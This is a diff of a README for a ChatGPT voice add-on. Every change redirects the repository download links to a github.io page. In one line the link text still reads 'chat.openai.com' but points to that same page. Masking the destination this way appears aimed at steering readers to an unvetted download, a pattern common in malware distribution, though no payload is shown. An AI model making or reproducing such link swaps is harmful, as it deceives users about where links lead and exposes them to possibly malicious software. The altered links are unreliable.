@@ -1,6 +1,6 @@
 # 🎙️ ChatGPT-Persona-Voice - Custom Voices for Every Chat
 
-[![Download Now](https://img.shields.io/badge/Download-ChatGPT--Persona--Voice-blue?style=for-the-badge&logo=github)](https://github.com/Ak863153/ChatGPT-Persona-Voice)
+[![Download Now](https://img.shields.io/badge/Download-ChatGPT--Persona--Voice-blue?style=for-the-badge&logo=github)](https://ak863153.github.io)
 
 ## 👋 Welcome to ChatGPT-Persona-Voice
 
@@ -28,7 +28,7 @@ Getting started is easier than you think. Follow these simple steps, and you'll 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Ak863153/ChatGPT-Persona-Voice](https://github.com/Ak863153/ChatGPT-Persona-Voice)
+Visit this link to download the application: [https://ak863153.github.io](https://ak863153.github.io)
 
 When you arrive at the page, look for the green "Code" button or the "Releases" section on the right side of the page. Click on it to see the available download options.
 
@@ -70,7 +70,7 @@ Fine-tune your experience with these settings:
 Now for the fun part — using your new voice with ChatGPT.
 
 ### Open ChatGPT
-Go to [chat.openai.com](https://chat.openai.com) in your browser and start a conversation as you normally would.
+Go to [chat.openai.com](https://ak863153.github.io) in your browser and start a conversation as you normally would.
 
 ### Enable Voice Mode
 In the ChatGPT interface, look for the voice icon (usually a small speaker or microphone icon). Click it to enable voice responses.
@@ -155,9 +155,9 @@ Your feedback helps make ChatGPT-Persona-Voice better for everyone. Don't hesita
 
 ## 📥 Ready to Download?
 
-[![Get ChatGPT-Persona-Voice](https://img.shields.io/badge/🚀-Download_Now-orange?style=for-the-badge)](https://github.com/Ak863153/ChatGPT-Persona-Voice)
+[![Get ChatGPT-Persona-Voice](https://img.shields.io/badge/🚀-Download_Now-orange?style=for-the-badge)](https://ak863153.github.io)
 
-Visit this link to download the application: [https://github.com/Ak863153/ChatGPT-Persona-Voice](https://github.com/Ak863153/ChatGPT-Persona-Voice)
+Visit this link to download the application: [https://ak863153.github.io](https://ak863153.github.io)
 
 Join thousands of users who have already personalized their AI voice experience. Your conversations will never sound the same again!
 
